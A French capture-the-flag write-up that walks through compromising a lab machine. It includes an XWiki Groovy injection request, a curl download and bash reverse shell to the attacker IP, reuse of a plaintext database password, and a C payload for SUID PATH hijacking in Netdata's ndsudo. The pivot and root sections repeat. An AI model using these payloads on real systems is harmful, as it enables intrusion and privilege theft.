![Cover](cover.png)

### 1. Reconnaissance Initiale & Scanning

Ma méthodologie débute par une phase de **Port Scanning** agressive pour identifier la surface d'exposition. J'utilise **nmap** en deux passes : une détection rapide de tous les ports TCP, suivie d'une énumération précise des services.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 -vvv 10.10.11.80 -oN all_ports.nmap

# Scan de services détaillé
nmap -p 22,80,8080 -sCV 10.10.11.80 -oN service_scan.nmap
```

Le scan révèle trois points d'entrée :
*   **Port 22 (SSH)** : OpenSSH 8.9p1 (Ubuntu).
*   **Port 80 (HTTP)** : Nginx 1.18.0, redirigeant vers `http://editor.htb/`.
*   **Port 8080 (HTTP)** : Jetty 10.0.20, hébergeant une instance **XWiki**.

### 2. Énumération Web & Virtual Hosting

Le serveur utilise le **Virtual Hosting**. Je procède à une recherche de sous-domaines via **ffuf** pour découvrir d'éventuels services cachés.

```bash
ffuf -u http://10.10.11.80 -H "Host: FUZZ.editor.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

Le fuzzing identifie le sous-domaine `wiki.editor.htb`. J'ajoute les entrées à mon fichier `/etc/hosts` :
`10.10.11.80 editor.htb wiki.editor.htb`

L'analyse du site principal (`editor.htb`) montre une application **React** statique servant de vitrine pour un éditeur de code. Le répertoire `/assets` est énuméré avec **feroxbuster**, mais ne révèle aucun vecteur d'attaque immédiat.

```bash
feroxbuster -u http://editor.htb -x html,js,txt
```

### 3. Analyse de la Surface d'Attaque (XWiki)

Je concentre mon attention sur `wiki.editor.htb` (port 8080). Le footer indique la version : **XWiki Debian 15.10.8**. 

> **Schéma Mental :**
> Identification de version (XWiki 15.10.8) -> Recherche de vulnérabilités connues (CVE) -> Focus sur les vulnérabilités de type **Remote Code Execution (RCE)** non-authentifiées -> Découverte de la **CVE-2025-24893**.

La **CVE-2025-24893** est une vulnérabilité critique permettant une **Groovy Script Injection** via le composant `SolrSearch`. Un attaquant non-authentifié peut injecter du code arbitraire dans le paramètre `text` si le paramètre `media=rss` est présent.

### 4. Exploitation de la CVE-2025-24893

Le **Proof of Concept (PoC)** consiste à injecter une directive `{{groovy}}` dans la requête de recherche. Le moteur de template de XWiki interprète alors le script côté serveur.

**Test de vulnérabilité (RCE Check) :**
J'utilise le payload suivant pour confirmer l'exécution de code en calculant une opération arithmétique :
`}}}{{async async=false}}{{groovy}}println("Exploit-Test:" + (20+22)){{/groovy}}{{/async}}`

Une fois encodé en **URL-encoded** et envoyé via **Burp Suite** :
```http
GET /xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(%22Exploit-Test%3A%22%20%2B%20(20%2B22))%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D HTTP/1.1
Host: wiki.editor.htb
```
La réponse contient `Exploit-Test:42`, confirmant la **RCE**.

### 5. Établissement du Premier Shell

L'exécution directe de commandes via `java.lang.Runtime` ou les pipes Bash (`|`) échoue souvent dans les environnements Java/Groovy à cause de la gestion des flux. Je contourne cette restriction en téléchargeant un script de **Reverse Shell** sur la cible.

**Payload Groovy pour l'exécution :**
`"id".execute().text` (pour vérification)
`"curl http://10.10.14.6/rev.sh -o /dev/shm/rev.sh".execute()` (pour le drop)

**Étapes de l'attaque :**
1.  Préparation du script `rev.sh` localement :
    ```bash
    #!/bin/bash
    bash -i >& /dev/tcp/10.10.14.6/443 0>&1
    ```
2.  Lancement d'un serveur HTTP Python : `python3 -m http.server 80`.
3.  Injection du payload pour télécharger le script dans `/dev/shm` (répertoire en mémoire, souvent accessible en écriture).
4.  Exécution du script via Groovy :
    `"bash /dev/shm/rev.sh".execute()`

**Capture du Shell :**
```bash
# Sur ma machine d'attaque
nc -lnvp 443

# Connexion reçue
xwiki@editor:/usr/lib/xwiki-jetty$ id
uid=1001(xwiki) gid=1001(xwiki) groups=1001(xwiki)
```

Je stabilise immédiatement mon shell pour obtenir un **TTY** complet :
```bash
script /dev/null -c bash
# CTRL+Z
stty raw -echo; fg
reset
export TERM=xterm
```

---

### Énumération Post-Exploitation & Pivot vers l'utilisateur

Une fois l'accès initial obtenu en tant qu'utilisateur **xwiki**, ma priorité est d'identifier des vecteurs de mouvement latéral. L'énumération du système de fichiers et des fichiers de configuration est cruciale dans un environnement **Java/XWiki**.

#### Énumération des utilisateurs et configurations
L'examen du répertoire `/home` révèle l'existence d'un utilisateur nommé **oliver**. Pour trouver des vecteurs de pivot, je fouille les fichiers de configuration de l'application **XWiki** situés dans `/etc/xwiki`.

Le fichier **hibernate.cfg.xml** est particulièrement critique car il contient les paramètres de connexion à la base de données via l'**ORM Hibernate**.

```bash
# Recherche de credentials dans la configuration Hibernate
cat /etc/xwiki/hibernate.cfg.xml | grep -A 5 "connection.password"
```

J'y découvre les identifiants suivants :
*   **Username** : `xwiki`
*   **Password** : `theEd1t0rTeam99`

#### Mouvement Latéral : Password Reuse
Dans de nombreux environnements, les administrateurs réutilisent les mots de passe de service pour leurs comptes personnels. Je teste ce mot de passe contre le service **SSH** pour l'utilisateur **oliver**.

```bash
# Vérification du Password Reuse avec NetExec
netexec ssh 10.10.11.80 -u oliver -p theEd1t0rTeam99
# Connexion SSH
sshpass -p theEd1t0rTeam99 ssh oliver@editor.htb
```

> **Schéma Mental : Pivot via Database Credentials**
> 1. **Extraction** : Lecture des fichiers de configuration applicatifs (Hibernate XML).
> 2. **Hypothèse** : Le mot de passe de la base de données est partagé par l'administrateur système.
> 3. **Validation** : Tentative d'authentification SSH sur le compte `oliver`.
> 4. **Résultat** : Accès SSH établi, transition de l'utilisateur de service vers un utilisateur physique.

---

### Escalade de Privilèges : De oliver à root

En tant qu'**oliver**, je procède à une énumération des services réseaux internes et des binaires avec des permissions spéciales.

#### Énumération des services locaux
L'utilisation de `ss` révèle plusieurs ports écoutant uniquement sur l'interface de **Loopback** (127.0.0.1).

```bash
# Identification des services locaux
ss -tnl
```

Le port **19999** attire mon attention. Après avoir mis en place un **SSH Tunneling** (Local Port Forwarding), je découvre qu'il s'agit d'une instance de **Netdata**, un outil de monitoring.

```bash
# Tunneling SSH pour accéder au dashboard Netdata
ssh -L 19999:localhost:19999 oliver@editor.htb
```

#### Analyse de la vulnérabilité Netdata (CVE-2024-32019)
La version installée est la **1.45.2**. Cette version spécifique contient un binaire **SetUID** vulnérable nommé `ndsudo`.

```bash
# Vérification de la version et des permissions
/opt/netdata/bin/netdata -W buildinfo | grep Version
ls -l /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

Le binaire `ndsudo` possède le **SUID bit** (propriété de root). Son rôle est d'exécuter certaines commandes privilégiées (comme `nvme-list`). Cependant, il est vulnérable à une **PATH Injection** car il ne définit pas de chemin absolu pour les exécutables qu'il appelle.

#### Exploitation : SUID PATH Hijacking
La logique de l'attaque consiste à créer un faux binaire nommé `nvme` dans un répertoire contrôlé, puis à modifier la variable d'environnement **PATH** pour forcer `ndsudo` à exécuter mon code avec les privilèges **root**.

**Payload C (root.c) :**
```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/root_shell; chmod +s /tmp/root_shell");
    return 0;
}
```

**Chaîne d'exécution :**
```bash
# Compilation et préparation
gcc root.c -o nvme
chmod +x nvme

# Injection du PATH et déclenchement via ndsudo
export PATH=/dev/shm:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

# Accès final
/tmp/root_shell -p
```

> **Schéma Mental : SUID PATH Injection**
> 1. **Identification** : Un binaire SUID (`ndsudo`) appelle des commandes externes (`nvme`).
> 2. **Faiblesse** : Le binaire utilise le **PATH** de l'utilisateur pour localiser l'exécutable au lieu d'un chemin statique (`/usr/bin/nvme`).
> 3. **Manipulation** : Création d'un binaire malveillant portant le même nom dans `/dev/shm`.
> 4. **Exécution** : En plaçant `/dev/shm` au début du **PATH**, `ndsudo` (tournant en root) exécute le faux binaire, nous octroyant un shell privilégié.

---

### Phase 3 : Élévation de Privilèges & Domination

#### Pivot vers l'utilisateur oliver

Après avoir obtenu un accès initial en tant qu'utilisateur `xwiki`, j'énumère les fichiers de configuration pour identifier des vecteurs de pivot. Le fichier **Hibernate** (`/etc/xwiki/hibernate.cfg.xml`), qui gère l'**Object-Relational Mapping** pour la base de données **MySQL**, contient des identifiants en clair.

```bash
# Extraction des credentials de la base de données
grep -A 1 "hibernate.connection.password" /etc/xwiki/hibernate.cfg.xml
# Résultat : <property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

Je teste la réutilisation de ce mot de passe pour l'utilisateur `oliver` via **SSH**. Le succès de l'authentification confirme une politique de mot de passe faible (Password Reuse).

```bash
ssh oliver@editor.htb # Password: theEd1t0rTeam99
```

---

#### Élévation de Privilèges (Root)

L'énumération des services locaux via `ss -tnl` révèle un service écoutant sur le port **19999**. Après avoir établi un **SSH Tunneling** (Local Port Forwarding), j'identifie une instance de **NetData** en version **1.45.2**.

> **Schéma Mental : Exploitation de ndsudo (CVE-2024-32019)**
> 1. **Constat** : Le binaire `ndsudo` possède le bit **SUID** (Root) pour permettre à NetData d'exécuter des commandes de diagnostic.
> 2. **Vulnérabilité** : Le binaire appelle des utilitaires système (ex: `nvme`) sans utiliser de **Absolute Path**.
> 3. **Vecteur** : En modifiant la variable d'environnement **PATH**, je peux forcer `ndsudo` à exécuter un binaire malveillant portant le même nom que l'utilitaire légitime, mais situé dans un répertoire sous mon contrôle.
> 4. **Résultat** : Exécution de code arbitraire avec les privilèges de l'owner du binaire SUID (Root).

Je localise le binaire vulnérable :
```bash
find / -name ndsudo -ls 2>/dev/null
# /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo (SUID Root)
```

Je prépare un exploit en **C** pour copier `/bin/bash` avec les permissions **SUID** dans `/tmp`, garantissant un accès persistant.

```c
// root.c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
    return 0;
}
```

Je compile l'exploit, je le nomme `nvme` (une commande autorisée par `ndsudo`) et j'injecte mon répertoire actuel dans le **PATH** lors de l'exécution.

```bash
# Compilation et préparation
gcc root.c -o nvme
chmod +x nvme

# Exploitation via PATH Injection
PATH=/dev/shm:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

# Accès Root
/tmp/rootbash -p
```

---

#### Analyse Post-Exploitation : Beyond Root

Un comportement atypique a été observé durant la phase de pivot : l'impossibilité d'utiliser la commande `su` depuis l'utilisateur `xwiki`, même avec le mot de passe correct. L'analyse du fichier d'unité **systemd** (`/lib/systemd/system/xwiki.service`) explique ce mécanisme de durcissement.

```ini
[Service]
User=xwiki
Group=xwiki
NoNewPrivileges=true
ProtectSystem=strict
```

La directive **NoNewPrivileges=true** est une mesure de sécurité critique au niveau du noyau (**kernel**). Lorsqu'elle est activée, le flag `PR_SET_NO_NEW_PRIVS` est positionné pour le processus et tous ses enfants. Cela empêche toute opération `execve()` d'accorder de nouveaux privilèges, rendant les binaires **SUID** (comme `su` ou `sudo`) inopérants, car le noyau refuse d'élever les privilèges du processus lors de l'exécution, même si le bit SUID est présent sur le fichier. C'est une excellente défense contre les escalades de privilèges locales via des binaires système mal configurés.